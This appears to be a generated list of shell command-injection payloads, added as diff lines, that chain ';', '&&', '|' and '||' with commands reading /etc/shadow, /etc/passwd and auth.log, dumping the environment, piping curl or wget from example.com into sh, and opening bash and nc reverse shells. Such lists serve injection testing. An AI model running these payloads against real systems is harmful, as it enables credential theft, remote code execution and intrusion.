+ls -la /etc || /usr/bin/printf 'pwned\n'
+ls -la /etc ; chmod +x /tmp/pwned
+ls -la /etc && chmod +x /tmp/pwned
+ls -la /etc | chmod +x /tmp/pwned
+ls -la /etc || chmod +x /tmp/pwned
+ls -la /etc ; tar -cf /tmp/dump.tar /etc
+ls -la /etc && tar -cf /tmp/dump.tar /etc
+ls -la /etc | tar -cf /tmp/dump.tar /etc
+ls -la /etc || tar -cf /tmp/dump.tar /etc
+ls -la /etc ; openssl s_client -connect example.com:443
+ls -la /etc && openssl s_client -connect example.com:443
+ls -la /etc | openssl s_client -connect example.com:443
+ls -la /etc || openssl s_client -connect example.com:443
+ls -la /etc ; ssh localhost id
+ls -la /etc && ssh localhost id
+ls -la /etc | ssh localhost id
+ls -la /etc || ssh localhost id
+ls -la /etc ; ftp http://example.com/pwn.sh
+ls -la /etc && ftp http://example.com/pwn.sh
+ls -la /etc | ftp http://example.com/pwn.sh
+ls -la /etc || ftp http://example.com/pwn.sh
+ls -lha /root ; id
+ls -lha /root && id
+ls -lha /root | id
+ls -lha /root || id
+ls -lha /root ; uname -a
+ls -lha /root && uname -a
+ls -lha /root | uname -a
+ls -lha /root || uname -a
+ls -lha /root ; whoami
+ls -lha /root && whoami
+ls -lha /root | whoami
+ls -lha /root || whoami
+ls -lha /root ; ls -la /
+ls -lha /root && ls -la /
+ls -lha /root | ls -la /
+ls -lha /root || ls -la /
+ls -lha /root ; ls -la /etc
+ls -lha /root && ls -la /etc
+ls -lha /root | ls -la /etc
+ls -lha /root || ls -la /etc
+ls -lha /root ; ls -lha /root
+ls -lha /root && ls -lha /root
+ls -lha /root | ls -lha /root
+ls -lha /root || ls -lha /root
+ls -lha /root ; cat /etc/passwd
+ls -lha /root && cat /etc/passwd
+ls -lha /root | cat /etc/passwd
+ls -lha /root || cat /etc/passwd
+ls -lha /root ; cat /etc/shadow
+ls -lha /root && cat /etc/shadow
+ls -lha /root | cat /etc/shadow
+ls -lha /root || cat /etc/shadow
+ls -lha /root ; cat /etc/hosts
+ls -lha /root && cat /etc/hosts
+ls -lha /root | cat /etc/hosts
+ls -lha /root || cat /etc/hosts
+ls -lha /root ; cat /var/log/auth.log
+ls -lha /root && cat /var/log/auth.log
+ls -lha /root | cat /var/log/auth.log
+ls -lha /root || cat /var/log/auth.log
+ls -lha /root ; env
+ls -lha /root && env
+ls -lha /root | env
+ls -lha /root || env
+ls -lha /root ; ps aux
+ls -lha /root && ps aux
+ls -lha /root | ps aux
+ls -lha /root || ps aux
+ls -lha /root ; netstat -tulnp
+ls -lha /root && netstat -tulnp
+ls -lha /root | netstat -tulnp
+ls -lha /root || netstat -tulnp
+ls -lha /root ; mtr -r 127.0.0.1 -c 1
+ls -lha /root && mtr -r 127.0.0.1 -c 1
+ls -lha /root | mtr -r 127.0.0.1 -c 1
+ls -lha /root || mtr -r 127.0.0.1 -c 1
+ls -lha /root ; curl http://example.com/pwn.sh | sh
+ls -lha /root && curl http://example.com/pwn.sh | sh
+ls -lha /root | curl http://example.com/pwn.sh | sh
+ls -lha /root || curl http://example.com/pwn.sh | sh
+ls -lha /root ; wget http://example.com/pwn.sh -O- | sh
+ls -lha /root && wget http://example.com/pwn.sh -O- | sh
+ls -lha /root | wget http://example.com/pwn.sh -O- | sh
+ls -lha /root || wget http://example.com/pwn.sh -O- | sh
+ls -lha /root ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -lha /root && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -lha /root | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -lha /root || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ls -lha /root ; nc 127.0.0.1 4444 -e /bin/bash
+ls -lha /root && nc 127.0.0.1 4444 -e /bin/bash
+ls -lha /root | nc 127.0.0.1 4444 -e /bin/bash
+ls -lha /root || nc 127.0.0.1 4444 -e /bin/bash
+ls -lha /root ; python -c 'import os;print(os.listdir("/"))'
+ls -lha /root && python -c 'import os;print(os.listdir("/"))'
+ls -lha /root | python -c 'import os;print(os.listdir("/"))'
+ls -lha /root || python -c 'import os;print(os.listdir("/"))'
+ls -lha /root ; perl -e 'print "pwned"'
+ls -lha /root && perl -e 'print "pwned"'
+ls -lha /root | perl -e 'print "pwned"'
+ls -lha /root || perl -e 'print "pwned"'
+ls -lha /root ; php -r 'system("id");'
+ls -lha /root && php -r 'system("id");'
+ls -lha /root | php -r 'system("id");'
+ls -lha /root || php -r 'system("id");'
+ls -lha /root ; ruby -e 'puts `id`'
+ls -lha /root && ruby -e 'puts `id`'
+ls -lha /root | ruby -e 'puts `id`'
+ls -lha /root || ruby -e 'puts `id`'
+ls -lha /root ; /bin/bash -c 'id'
+ls -lha /root && /bin/bash -c 'id'
+ls -lha /root | /bin/bash -c 'id'
+ls -lha /root || /bin/bash -c 'id'
+ls -lha /root ; /usr/bin/id >/tmp/id.txt
+ls -lha /root && /usr/bin/id >/tmp/id.txt
+ls -lha /root | /usr/bin/id >/tmp/id.txt
+ls -lha /root || /usr/bin/id >/tmp/id.txt
+ls -lha /root ; /bin/echo pwned > /tmp/pwned.txt
+ls -lha /root && /bin/echo pwned > /tmp/pwned.txt
+ls -lha /root | /bin/echo pwned > /tmp/pwned.txt
+ls -lha /root || /bin/echo pwned > /tmp/pwned.txt
+ls -lha /root ; /usr/bin/printf 'pwned\n'
+ls -lha /root && /usr/bin/printf 'pwned\n'
+ls -lha /root | /usr/bin/printf 'pwned\n'
+ls -lha /root || /usr/bin/printf 'pwned\n'
+ls -lha /root ; chmod +x /tmp/pwned
+ls -lha /root && chmod +x /tmp/pwned
+ls -lha /root | chmod +x /tmp/pwned
+ls -lha /root || chmod +x /tmp/pwned
+ls -lha /root ; tar -cf /tmp/dump.tar /etc
+ls -lha /root && tar -cf /tmp/dump.tar /etc
+ls -lha /root | tar -cf /tmp/dump.tar /etc
+ls -lha /root || tar -cf /tmp/dump.tar /etc
+ls -lha /root ; openssl s_client -connect example.com:443
+ls -lha /root && openssl s_client -connect example.com:443
+ls -lha /root | openssl s_client -connect example.com:443
+ls -lha /root || openssl s_client -connect example.com:443
+ls -lha /root ; ssh localhost id
+ls -lha /root && ssh localhost id
+ls -lha /root | ssh localhost id
+ls -lha /root || ssh localhost id
+ls -lha /root ; ftp http://example.com/pwn.sh
+ls -lha /root && ftp http://example.com/pwn.sh
+ls -lha /root | ftp http://example.com/pwn.sh
+ls -lha /root || ftp http://example.com/pwn.sh
+cat /etc/passwd ; id
+cat /etc/passwd && id
+cat /etc/passwd | id
+cat /etc/passwd || id
+cat /etc/passwd ; uname -a
+cat /etc/passwd && uname -a
+cat /etc/passwd | uname -a
+cat /etc/passwd || uname -a
+cat /etc/passwd ; whoami
+cat /etc/passwd && whoami
+cat /etc/passwd | whoami
+cat /etc/passwd || whoami
+cat /etc/passwd ; ls -la /
+cat /etc/passwd && ls -la /
+cat /etc/passwd | ls -la /
+cat /etc/passwd || ls -la /
+cat /etc/passwd ; ls -la /etc
+cat /etc/passwd && ls -la /etc
+cat /etc/passwd | ls -la /etc
+cat /etc/passwd || ls -la /etc
+cat /etc/passwd ; ls -lha /root
+cat /etc/passwd && ls -lha /root
+cat /etc/passwd | ls -lha /root
+cat /etc/passwd || ls -lha /root
+cat /etc/passwd ; cat /etc/passwd
+cat /etc/passwd && cat /etc/passwd
+cat /etc/passwd | cat /etc/passwd
+cat /etc/passwd || cat /etc/passwd
+cat /etc/passwd ; cat /etc/shadow
+cat /etc/passwd && cat /etc/shadow
+cat /etc/passwd | cat /etc/shadow
+cat /etc/passwd || cat /etc/shadow
+cat /etc/passwd ; cat /etc/hosts
+cat /etc/passwd && cat /etc/hosts
+cat /etc/passwd | cat /etc/hosts
+cat /etc/passwd || cat /etc/hosts
+cat /etc/passwd ; cat /var/log/auth.log
+cat /etc/passwd && cat /var/log/auth.log
+cat /etc/passwd | cat /var/log/auth.log
+cat /etc/passwd || cat /var/log/auth.log
+cat /etc/passwd ; env
+cat /etc/passwd && env
+cat /etc/passwd | env
+cat /etc/passwd || env
+cat /etc/passwd ; ps aux
+cat /etc/passwd && ps aux
+cat /etc/passwd | ps aux
+cat /etc/passwd || ps aux
+cat /etc/passwd ; netstat -tulnp
+cat /etc/passwd && netstat -tulnp
+cat /etc/passwd | netstat -tulnp
+cat /etc/passwd || netstat -tulnp
+cat /etc/passwd ; mtr -r 127.0.0.1 -c 1
+cat /etc/passwd && mtr -r 127.0.0.1 -c 1
+cat /etc/passwd | mtr -r 127.0.0.1 -c 1
+cat /etc/passwd || mtr -r 127.0.0.1 -c 1
+cat /etc/passwd ; curl http://example.com/pwn.sh | sh
+cat /etc/passwd && curl http://example.com/pwn.sh | sh
+cat /etc/passwd | curl http://example.com/pwn.sh | sh
+cat /etc/passwd || curl http://example.com/pwn.sh | sh
+cat /etc/passwd ; wget http://example.com/pwn.sh -O- | sh
+cat /etc/passwd && wget http://example.com/pwn.sh -O- | sh
+cat /etc/passwd | wget http://example.com/pwn.sh -O- | sh
+cat /etc/passwd || wget http://example.com/pwn.sh -O- | sh
+cat /etc/passwd ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/passwd && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/passwd | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/passwd || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/passwd ; nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/passwd && nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/passwd | nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/passwd || nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/passwd ; python -c 'import os;print(os.listdir("/"))'
+cat /etc/passwd && python -c 'import os;print(os.listdir("/"))'
+cat /etc/passwd | python -c 'import os;print(os.listdir("/"))'
+cat /etc/passwd || python -c 'import os;print(os.listdir("/"))'
+cat /etc/passwd ; perl -e 'print "pwned"'
+cat /etc/passwd && perl -e 'print "pwned"'
+cat /etc/passwd | perl -e 'print "pwned"'
+cat /etc/passwd || perl -e 'print "pwned"'
+cat /etc/passwd ; php -r 'system("id");'
+cat /etc/passwd && php -r 'system("id");'
+cat /etc/passwd | php -r 'system("id");'
+cat /etc/passwd || php -r 'system("id");'
+cat /etc/passwd ; ruby -e 'puts `id`'
+cat /etc/passwd && ruby -e 'puts `id`'
+cat /etc/passwd | ruby -e 'puts `id`'
+cat /etc/passwd || ruby -e 'puts `id`'
+cat /etc/passwd ; /bin/bash -c 'id'
+cat /etc/passwd && /bin/bash -c 'id'
+cat /etc/passwd | /bin/bash -c 'id'
+cat /etc/passwd || /bin/bash -c 'id'
+cat /etc/passwd ; /usr/bin/id >/tmp/id.txt
+cat /etc/passwd && /usr/bin/id >/tmp/id.txt
+cat /etc/passwd | /usr/bin/id >/tmp/id.txt
+cat /etc/passwd || /usr/bin/id >/tmp/id.txt
+cat /etc/passwd ; /bin/echo pwned > /tmp/pwned.txt
+cat /etc/passwd && /bin/echo pwned > /tmp/pwned.txt
+cat /etc/passwd | /bin/echo pwned > /tmp/pwned.txt
+cat /etc/passwd || /bin/echo pwned > /tmp/pwned.txt
+cat /etc/passwd ; /usr/bin/printf 'pwned\n'
+cat /etc/passwd && /usr/bin/printf 'pwned\n'
+cat /etc/passwd | /usr/bin/printf 'pwned\n'
+cat /etc/passwd || /usr/bin/printf 'pwned\n'
+cat /etc/passwd ; chmod +x /tmp/pwned
+cat /etc/passwd && chmod +x /tmp/pwned
+cat /etc/passwd | chmod +x /tmp/pwned
+cat /etc/passwd || chmod +x /tmp/pwned
+cat /etc/passwd ; tar -cf /tmp/dump.tar /etc
+cat /etc/passwd && tar -cf /tmp/dump.tar /etc
+cat /etc/passwd | tar -cf /tmp/dump.tar /etc
+cat /etc/passwd || tar -cf /tmp/dump.tar /etc
+cat /etc/passwd ; openssl s_client -connect example.com:443
+cat /etc/passwd && openssl s_client -connect example.com:443
+cat /etc/passwd | openssl s_client -connect example.com:443
+cat /etc/passwd || openssl s_client -connect example.com:443
+cat /etc/passwd ; ssh localhost id
+cat /etc/passwd && ssh localhost id
+cat /etc/passwd | ssh localhost id
+cat /etc/passwd || ssh localhost id
+cat /etc/passwd ; ftp http://example.com/pwn.sh
+cat /etc/passwd && ftp http://example.com/pwn.sh
+cat /etc/passwd | ftp http://example.com/pwn.sh
+cat /etc/passwd || ftp http://example.com/pwn.sh
+cat /etc/shadow ; id
+cat /etc/shadow && id
+cat /etc/shadow | id
+cat /etc/shadow || id
+cat /etc/shadow ; uname -a
+cat /etc/shadow && uname -a
+cat /etc/shadow | uname -a
+cat /etc/shadow || uname -a
+cat /etc/shadow ; whoami
+cat /etc/shadow && whoami
+cat /etc/shadow | whoami
+cat /etc/shadow || whoami
+cat /etc/shadow ; ls -la /
+cat /etc/shadow && ls -la /
+cat /etc/shadow | ls -la /
+cat /etc/shadow || ls -la /
+cat /etc/shadow ; ls -la /etc
+cat /etc/shadow && ls -la /etc
+cat /etc/shadow | ls -la /etc
+cat /etc/shadow || ls -la /etc
+cat /etc/shadow ; ls -lha /root
+cat /etc/shadow && ls -lha /root
+cat /etc/shadow | ls -lha /root
+cat /etc/shadow || ls -lha /root
+cat /etc/shadow ; cat /etc/passwd
+cat /etc/shadow && cat /etc/passwd
+cat /etc/shadow | cat /etc/passwd
+cat /etc/shadow || cat /etc/passwd
+cat /etc/shadow ; cat /etc/shadow
+cat /etc/shadow && cat /etc/shadow
+cat /etc/shadow | cat /etc/shadow
+cat /etc/shadow || cat /etc/shadow
+cat /etc/shadow ; cat /etc/hosts
+cat /etc/shadow && cat /etc/hosts
+cat /etc/shadow | cat /etc/hosts
+cat /etc/shadow || cat /etc/hosts
+cat /etc/shadow ; cat /var/log/auth.log
+cat /etc/shadow && cat /var/log/auth.log
+cat /etc/shadow | cat /var/log/auth.log
+cat /etc/shadow || cat /var/log/auth.log
+cat /etc/shadow ; env
+cat /etc/shadow && env
+cat /etc/shadow | env
+cat /etc/shadow || env
+cat /etc/shadow ; ps aux
+cat /etc/shadow && ps aux
+cat /etc/shadow | ps aux
+cat /etc/shadow || ps aux
+cat /etc/shadow ; netstat -tulnp
+cat /etc/shadow && netstat -tulnp
+cat /etc/shadow | netstat -tulnp
+cat /etc/shadow || netstat -tulnp
+cat /etc/shadow ; mtr -r 127.0.0.1 -c 1
+cat /etc/shadow && mtr -r 127.0.0.1 -c 1
+cat /etc/shadow | mtr -r 127.0.0.1 -c 1
+cat /etc/shadow || mtr -r 127.0.0.1 -c 1
+cat /etc/shadow ; curl http://example.com/pwn.sh | sh
+cat /etc/shadow && curl http://example.com/pwn.sh | sh
+cat /etc/shadow | curl http://example.com/pwn.sh | sh
+cat /etc/shadow || curl http://example.com/pwn.sh | sh
+cat /etc/shadow ; wget http://example.com/pwn.sh -O- | sh
+cat /etc/shadow && wget http://example.com/pwn.sh -O- | sh
+cat /etc/shadow | wget http://example.com/pwn.sh -O- | sh
+cat /etc/shadow || wget http://example.com/pwn.sh -O- | sh
+cat /etc/shadow ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/shadow && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/shadow | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/shadow || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/shadow ; nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/shadow && nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/shadow | nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/shadow || nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/shadow ; python -c 'import os;print(os.listdir("/"))'
+cat /etc/shadow && python -c 'import os;print(os.listdir("/"))'
+cat /etc/shadow | python -c 'import os;print(os.listdir("/"))'
+cat /etc/shadow || python -c 'import os;print(os.listdir("/"))'
+cat /etc/shadow ; perl -e 'print "pwned"'
+cat /etc/shadow && perl -e 'print "pwned"'
+cat /etc/shadow | perl -e 'print "pwned"'
+cat /etc/shadow || perl -e 'print "pwned"'
+cat /etc/shadow ; php -r 'system("id");'
+cat /etc/shadow && php -r 'system("id");'
+cat /etc/shadow | php -r 'system("id");'
+cat /etc/shadow || php -r 'system("id");'
+cat /etc/shadow ; ruby -e 'puts `id`'
+cat /etc/shadow && ruby -e 'puts `id`'
+cat /etc/shadow | ruby -e 'puts `id`'
+cat /etc/shadow || ruby -e 'puts `id`'
+cat /etc/shadow ; /bin/bash -c 'id'
+cat /etc/shadow && /bin/bash -c 'id'
+cat /etc/shadow | /bin/bash -c 'id'
+cat /etc/shadow || /bin/bash -c 'id'
+cat /etc/shadow ; /usr/bin/id >/tmp/id.txt
+cat /etc/shadow && /usr/bin/id >/tmp/id.txt
+cat /etc/shadow | /usr/bin/id >/tmp/id.txt
+cat /etc/shadow || /usr/bin/id >/tmp/id.txt
+cat /etc/shadow ; /bin/echo pwned > /tmp/pwned.txt
+cat /etc/shadow && /bin/echo pwned > /tmp/pwned.txt
+cat /etc/shadow | /bin/echo pwned > /tmp/pwned.txt
+cat /etc/shadow || /bin/echo pwned > /tmp/pwned.txt
+cat /etc/shadow ; /usr/bin/printf 'pwned\n'
+cat /etc/shadow && /usr/bin/printf 'pwned\n'
+cat /etc/shadow | /usr/bin/printf 'pwned\n'
+cat /etc/shadow || /usr/bin/printf 'pwned\n'
+cat /etc/shadow ; chmod +x /tmp/pwned
+cat /etc/shadow && chmod +x /tmp/pwned
+cat /etc/shadow | chmod +x /tmp/pwned
+cat /etc/shadow || chmod +x /tmp/pwned
+cat /etc/shadow ; tar -cf /tmp/dump.tar /etc
+cat /etc/shadow && tar -cf /tmp/dump.tar /etc
+cat /etc/shadow | tar -cf /tmp/dump.tar /etc
+cat /etc/shadow || tar -cf /tmp/dump.tar /etc
+cat /etc/shadow ; openssl s_client -connect example.com:443
+cat /etc/shadow && openssl s_client -connect example.com:443
+cat /etc/shadow | openssl s_client -connect example.com:443
+cat /etc/shadow || openssl s_client -connect example.com:443
+cat /etc/shadow ; ssh localhost id
+cat /etc/shadow && ssh localhost id
+cat /etc/shadow | ssh localhost id
+cat /etc/shadow || ssh localhost id
+cat /etc/shadow ; ftp http://example.com/pwn.sh
+cat /etc/shadow && ftp http://example.com/pwn.sh
+cat /etc/shadow | ftp http://example.com/pwn.sh
+cat /etc/shadow || ftp http://example.com/pwn.sh
+cat /etc/hosts ; id
+cat /etc/hosts && id
+cat /etc/hosts | id
+cat /etc/hosts || id
+cat /etc/hosts ; uname -a
+cat /etc/hosts && uname -a
+cat /etc/hosts | uname -a
+cat /etc/hosts || uname -a
+cat /etc/hosts ; whoami
+cat /etc/hosts && whoami
+cat /etc/hosts | whoami
+cat /etc/hosts || whoami
+cat /etc/hosts ; ls -la /
+cat /etc/hosts && ls -la /
+cat /etc/hosts | ls -la /
+cat /etc/hosts || ls -la /
+cat /etc/hosts ; ls -la /etc
+cat /etc/hosts && ls -la /etc
+cat /etc/hosts | ls -la /etc
+cat /etc/hosts || ls -la /etc
+cat /etc/hosts ; ls -lha /root
+cat /etc/hosts && ls -lha /root
+cat /etc/hosts | ls -lha /root
+cat /etc/hosts || ls -lha /root
+cat /etc/hosts ; cat /etc/passwd
+cat /etc/hosts && cat /etc/passwd
+cat /etc/hosts | cat /etc/passwd
+cat /etc/hosts || cat /etc/passwd
+cat /etc/hosts ; cat /etc/shadow
+cat /etc/hosts && cat /etc/shadow
+cat /etc/hosts | cat /etc/shadow
+cat /etc/hosts || cat /etc/shadow
+cat /etc/hosts ; cat /etc/hosts
+cat /etc/hosts && cat /etc/hosts
+cat /etc/hosts | cat /etc/hosts
+cat /etc/hosts || cat /etc/hosts
+cat /etc/hosts ; cat /var/log/auth.log
+cat /etc/hosts && cat /var/log/auth.log
+cat /etc/hosts | cat /var/log/auth.log
+cat /etc/hosts || cat /var/log/auth.log
+cat /etc/hosts ; env
+cat /etc/hosts && env
+cat /etc/hosts | env
+cat /etc/hosts || env
+cat /etc/hosts ; ps aux
+cat /etc/hosts && ps aux
+cat /etc/hosts | ps aux
+cat /etc/hosts || ps aux
+cat /etc/hosts ; netstat -tulnp
+cat /etc/hosts && netstat -tulnp
+cat /etc/hosts | netstat -tulnp
+cat /etc/hosts || netstat -tulnp
+cat /etc/hosts ; mtr -r 127.0.0.1 -c 1
+cat /etc/hosts && mtr -r 127.0.0.1 -c 1
+cat /etc/hosts | mtr -r 127.0.0.1 -c 1
+cat /etc/hosts || mtr -r 127.0.0.1 -c 1
+cat /etc/hosts ; curl http://example.com/pwn.sh | sh
+cat /etc/hosts && curl http://example.com/pwn.sh | sh
+cat /etc/hosts | curl http://example.com/pwn.sh | sh
+cat /etc/hosts || curl http://example.com/pwn.sh | sh
+cat /etc/hosts ; wget http://example.com/pwn.sh -O- | sh
+cat /etc/hosts && wget http://example.com/pwn.sh -O- | sh
+cat /etc/hosts | wget http://example.com/pwn.sh -O- | sh
+cat /etc/hosts || wget http://example.com/pwn.sh -O- | sh
+cat /etc/hosts ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/hosts && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/hosts | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/hosts || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /etc/hosts ; nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/hosts && nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/hosts | nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/hosts || nc 127.0.0.1 4444 -e /bin/bash
+cat /etc/hosts ; python -c 'import os;print(os.listdir("/"))'
+cat /etc/hosts && python -c 'import os;print(os.listdir("/"))'
+cat /etc/hosts | python -c 'import os;print(os.listdir("/"))'
+cat /etc/hosts || python -c 'import os;print(os.listdir("/"))'
+cat /etc/hosts ; perl -e 'print "pwned"'
+cat /etc/hosts && perl -e 'print "pwned"'
+cat /etc/hosts | perl -e 'print "pwned"'
+cat /etc/hosts || perl -e 'print "pwned"'
+cat /etc/hosts ; php -r 'system("id");'
+cat /etc/hosts && php -r 'system("id");'
+cat /etc/hosts | php -r 'system("id");'
+cat /etc/hosts || php -r 'system("id");'
+cat /etc/hosts ; ruby -e 'puts `id`'
+cat /etc/hosts && ruby -e 'puts `id`'
+cat /etc/hosts | ruby -e 'puts `id`'
+cat /etc/hosts || ruby -e 'puts `id`'
+cat /etc/hosts ; /bin/bash -c 'id'
+cat /etc/hosts && /bin/bash -c 'id'
+cat /etc/hosts | /bin/bash -c 'id'
+cat /etc/hosts || /bin/bash -c 'id'
+cat /etc/hosts ; /usr/bin/id >/tmp/id.txt
+cat /etc/hosts && /usr/bin/id >/tmp/id.txt
+cat /etc/hosts | /usr/bin/id >/tmp/id.txt
+cat /etc/hosts || /usr/bin/id >/tmp/id.txt
+cat /etc/hosts ; /bin/echo pwned > /tmp/pwned.txt
+cat /etc/hosts && /bin/echo pwned > /tmp/pwned.txt
+cat /etc/hosts | /bin/echo pwned > /tmp/pwned.txt
+cat /etc/hosts || /bin/echo pwned > /tmp/pwned.txt
+cat /etc/hosts ; /usr/bin/printf 'pwned\n'
+cat /etc/hosts && /usr/bin/printf 'pwned\n'
+cat /etc/hosts | /usr/bin/printf 'pwned\n'
+cat /etc/hosts || /usr/bin/printf 'pwned\n'
+cat /etc/hosts ; chmod +x /tmp/pwned
+cat /etc/hosts && chmod +x /tmp/pwned
+cat /etc/hosts | chmod +x /tmp/pwned
+cat /etc/hosts || chmod +x /tmp/pwned
+cat /etc/hosts ; tar -cf /tmp/dump.tar /etc
+cat /etc/hosts && tar -cf /tmp/dump.tar /etc
+cat /etc/hosts | tar -cf /tmp/dump.tar /etc
+cat /etc/hosts || tar -cf /tmp/dump.tar /etc
+cat /etc/hosts ; openssl s_client -connect example.com:443
+cat /etc/hosts && openssl s_client -connect example.com:443
+cat /etc/hosts | openssl s_client -connect example.com:443
+cat /etc/hosts || openssl s_client -connect example.com:443
+cat /etc/hosts ; ssh localhost id
+cat /etc/hosts && ssh localhost id
+cat /etc/hosts | ssh localhost id
+cat /etc/hosts || ssh localhost id
+cat /etc/hosts ; ftp http://example.com/pwn.sh
+cat /etc/hosts && ftp http://example.com/pwn.sh
+cat /etc/hosts | ftp http://example.com/pwn.sh
+cat /etc/hosts || ftp http://example.com/pwn.sh
+cat /var/log/auth.log ; id
+cat /var/log/auth.log && id
+cat /var/log/auth.log | id
+cat /var/log/auth.log || id
+cat /var/log/auth.log ; uname -a
+cat /var/log/auth.log && uname -a
+cat /var/log/auth.log | uname -a
+cat /var/log/auth.log || uname -a
+cat /var/log/auth.log ; whoami
+cat /var/log/auth.log && whoami
+cat /var/log/auth.log | whoami
+cat /var/log/auth.log || whoami
+cat /var/log/auth.log ; ls -la /
+cat /var/log/auth.log && ls -la /
+cat /var/log/auth.log | ls -la /
+cat /var/log/auth.log || ls -la /
+cat /var/log/auth.log ; ls -la /etc
+cat /var/log/auth.log && ls -la /etc
+cat /var/log/auth.log | ls -la /etc
+cat /var/log/auth.log || ls -la /etc
+cat /var/log/auth.log ; ls -lha /root
+cat /var/log/auth.log && ls -lha /root
+cat /var/log/auth.log | ls -lha /root
+cat /var/log/auth.log || ls -lha /root
+cat /var/log/auth.log ; cat /etc/passwd
+cat /var/log/auth.log && cat /etc/passwd
+cat /var/log/auth.log | cat /etc/passwd
+cat /var/log/auth.log || cat /etc/passwd
+cat /var/log/auth.log ; cat /etc/shadow
+cat /var/log/auth.log && cat /etc/shadow
+cat /var/log/auth.log | cat /etc/shadow
+cat /var/log/auth.log || cat /etc/shadow
+cat /var/log/auth.log ; cat /etc/hosts
+cat /var/log/auth.log && cat /etc/hosts
+cat /var/log/auth.log | cat /etc/hosts
+cat /var/log/auth.log || cat /etc/hosts
+cat /var/log/auth.log ; cat /var/log/auth.log
+cat /var/log/auth.log && cat /var/log/auth.log
+cat /var/log/auth.log | cat /var/log/auth.log
+cat /var/log/auth.log || cat /var/log/auth.log
+cat /var/log/auth.log ; env
+cat /var/log/auth.log && env
+cat /var/log/auth.log | env
+cat /var/log/auth.log || env
+cat /var/log/auth.log ; ps aux
+cat /var/log/auth.log && ps aux
+cat /var/log/auth.log | ps aux
+cat /var/log/auth.log || ps aux
+cat /var/log/auth.log ; netstat -tulnp
+cat /var/log/auth.log && netstat -tulnp
+cat /var/log/auth.log | netstat -tulnp
+cat /var/log/auth.log || netstat -tulnp
+cat /var/log/auth.log ; mtr -r 127.0.0.1 -c 1
+cat /var/log/auth.log && mtr -r 127.0.0.1 -c 1
+cat /var/log/auth.log | mtr -r 127.0.0.1 -c 1
+cat /var/log/auth.log || mtr -r 127.0.0.1 -c 1
+cat /var/log/auth.log ; curl http://example.com/pwn.sh | sh
+cat /var/log/auth.log && curl http://example.com/pwn.sh | sh
+cat /var/log/auth.log | curl http://example.com/pwn.sh | sh
+cat /var/log/auth.log || curl http://example.com/pwn.sh | sh
+cat /var/log/auth.log ; wget http://example.com/pwn.sh -O- | sh
+cat /var/log/auth.log && wget http://example.com/pwn.sh -O- | sh
+cat /var/log/auth.log | wget http://example.com/pwn.sh -O- | sh
+cat /var/log/auth.log || wget http://example.com/pwn.sh -O- | sh
+cat /var/log/auth.log ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /var/log/auth.log && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /var/log/auth.log | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /var/log/auth.log || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+cat /var/log/auth.log ; nc 127.0.0.1 4444 -e /bin/bash
+cat /var/log/auth.log && nc 127.0.0.1 4444 -e /bin/bash
+cat /var/log/auth.log | nc 127.0.0.1 4444 -e /bin/bash
+cat /var/log/auth.log || nc 127.0.0.1 4444 -e /bin/bash
+cat /var/log/auth.log ; python -c 'import os;print(os.listdir("/"))'
+cat /var/log/auth.log && python -c 'import os;print(os.listdir("/"))'
+cat /var/log/auth.log | python -c 'import os;print(os.listdir("/"))'
+cat /var/log/auth.log || python -c 'import os;print(os.listdir("/"))'
+cat /var/log/auth.log ; perl -e 'print "pwned"'
+cat /var/log/auth.log && perl -e 'print "pwned"'
+cat /var/log/auth.log | perl -e 'print "pwned"'
+cat /var/log/auth.log || perl -e 'print "pwned"'
+cat /var/log/auth.log ; php -r 'system("id");'
+cat /var/log/auth.log && php -r 'system("id");'
+cat /var/log/auth.log | php -r 'system("id");'
+cat /var/log/auth.log || php -r 'system("id");'
+cat /var/log/auth.log ; ruby -e 'puts `id`'
+cat /var/log/auth.log && ruby -e 'puts `id`'
+cat /var/log/auth.log | ruby -e 'puts `id`'
+cat /var/log/auth.log || ruby -e 'puts `id`'
+cat /var/log/auth.log ; /bin/bash -c 'id'
+cat /var/log/auth.log && /bin/bash -c 'id'
+cat /var/log/auth.log | /bin/bash -c 'id'
+cat /var/log/auth.log || /bin/bash -c 'id'
+cat /var/log/auth.log ; /usr/bin/id >/tmp/id.txt
+cat /var/log/auth.log && /usr/bin/id >/tmp/id.txt
+cat /var/log/auth.log | /usr/bin/id >/tmp/id.txt
+cat /var/log/auth.log || /usr/bin/id >/tmp/id.txt
+cat /var/log/auth.log ; /bin/echo pwned > /tmp/pwned.txt
+cat /var/log/auth.log && /bin/echo pwned > /tmp/pwned.txt
+cat /var/log/auth.log | /bin/echo pwned > /tmp/pwned.txt
+cat /var/log/auth.log || /bin/echo pwned > /tmp/pwned.txt
+cat /var/log/auth.log ; /usr/bin/printf 'pwned\n'
+cat /var/log/auth.log && /usr/bin/printf 'pwned\n'
